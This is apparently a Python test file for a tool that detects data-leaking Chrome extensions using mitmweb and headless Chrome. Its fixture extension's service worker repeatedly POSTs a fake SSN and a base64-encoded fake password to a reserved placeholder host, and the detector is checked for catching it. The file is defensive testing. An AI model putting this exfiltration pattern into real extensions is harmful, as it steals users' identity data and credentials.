"""`dyn.py run` end to end: real mitmweb + detector + headless Chrome for Testing, scripted answers.

The extension under test is a tiny local one (real RSA key from openssl, so Chrome accepts its
manifest key). Its service worker keeps POSTing a fake SSN and password over plain HTTP to
dyn-run-test.test, a reserved name that doesn't exist: mitmproxy records the request, then fails to
forward it. Nothing leaves the machine, and no real extension's servers are contacted.
Skipped unless mitmweb, Chrome for Testing and openssl are available.
"""
import base64
import json
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO))
sys.path.insert(0, str(Path(__file__).resolve().parent))  # tests/ (shared helpers)
from dyntest import browser, mitm, prepare as prep, run as runmod  # noqa: E402
from dyntest.crx import id_from_public_key  # noqa: E402
from test_crx import _zip, make_crx3  # noqa: E402

OPENSSL = shutil.which("openssl")
READY = mitm.find("mitmweb") and browser.find_cft() and OPENSSL

BACKGROUND = """
const send = () => fetch("http://dyn-run-test.test/collect", {method: "POST",
  body: JSON.stringify({ssn: "900-12-3456", pw: btoa("Pollen!Test2048")})}).catch(() => {});
send(); setInterval(send, 700);
"""


def make_test_crx(dest: Path) -> tuple[Path, str]:
    key = dest / "key.pem"
    subprocess.run([OPENSSL, "genpkey", "-algorithm", "RSA", "-pkeyopt", "rsa_keygen_bits:2048", "-out", str(key)],
                   check=True, capture_output=True)
    pub = subprocess.run([OPENSSL, "pkey", "-in", str(key), "-pubout", "-outform", "DER"],
                         check=True, capture_output=True).stdout
    manifest = {"manifest_version": 3, "name": "dyn run test", "version": "0.1",
                "background": {"service_worker": "bg.js"}, "host_permissions": ["http://dyn-run-test.test/*"]}
    crx = dest / "runtest.crx"
    crx.write_bytes(make_crx3(pub, _zip(manifest, {"bg.js": BACKGROUND})))
    return crx, id_from_public_key(pub)


@unittest.skipUnless(READY, "needs mitmweb, Chrome for Testing and openssl")
class TestRun(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = Path(tempfile.mkdtemp(prefix="dyn-run-test-"))
        cls._runs, cls._build = runmod.RUNS, prep.BUILD
        runmod.RUNS, prep.BUILD = cls.tmp / "runs", cls.tmp / "build"
        cls.crx, cls.ext_id = make_test_crx(cls.tmp)

    @classmethod
    def tearDownClass(cls):
        runmod.RUNS, prep.BUILD = cls._runs, cls._build
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def go(self, selector, script, **kw):
        opts = runmod.RunOptions(selector, "session", baseline=2, passive=2, proxy_port=mitm.free_port(),
                                 web_port=mitm.free_port(), script=script, headless=True,
                                 out=open(self.tmp / "console.txt", "a"), **kw)
        d = runmod.run(opts)
        meta = json.loads((d / "meta.json").read_text())
        hits = [json.loads(l) for l in (d / "hits.jsonl").read_text().splitlines()]
        for port in (opts.proxy_port, opts.web_port):
            self.assertTrue(mitm.port_free(port), "proxy/UI still running after the run")
        return d, meta, hits

    def test_full_extension_run(self):
        # setup: Enter | active: "summarize", Enter, "done" | notes: Enter
        d, meta, hits = self.go(str(self.crx), ["", "summarize", "", "done", ""])
        self.assertEqual(meta["phases"], ["setup", "baseline", "passive", "active:summarize", "notes", "finished"])
        self.assertEqual(meta["extension"]["ext_id"], self.ext_id)
        self.assertTrue(meta["id_confirmed"], "Chrome did not load the extension under its real ID")
        self.assertFalse(meta["aborted"])
        leaks = [h for h in hits if h["strength"] == "strong" and not h["to_honeypot"] and h["phase"] != "setup"]
        self.assertTrue({"ssn", "login_password"} <= {h["field"] for h in leaks})
        self.assertTrue(all(h["is_extension_origin"] and h["host"] == "dyn-run-test.test" for h in leaks))
        self.assertTrue({h["encoding"] for h in leaks if h["field"] == "login_password"} & {"base64@0", "base64@1", "base64@2"})
        self.assertGreater(meta["summary"]["leak_hits"], 0)
        self.assertIn("ssn", meta["summary"]["fields_leaked"])
        self.assertGreater((d / "flows.mitm").stat().st_size, 0)
        self.assertGreater((d / "flows.har").stat().st_size, 0)
        phases = [json.loads(l)["phase"] for l in (d / "phases.jsonl").read_text().splitlines()]
        self.assertEqual(phases, meta["phases"])
        self.assertTrue((d / "notes.md").exists() and (d / "profile").is_dir())

    def test_ctrl_c_still_saves_a_closed_out_run(self):
        d, meta, _ = self.go("control", ["\x04"], discard_profile=True)    # EOF/Ctrl-C at the notes prompt
        self.assertTrue(meta["aborted"])
        self.assertEqual(meta["phases"], ["startup", "baseline", "passive", "notes", "finished"])
        self.assertIsNotNone(meta["ended"])
        self.assertIsNone(meta["id_confirmed"])
        self.assertTrue((d / "flows.mitm").exists())
        self.assertFalse((d / "profile").exists())


if __name__ == "__main__":
    unittest.main()
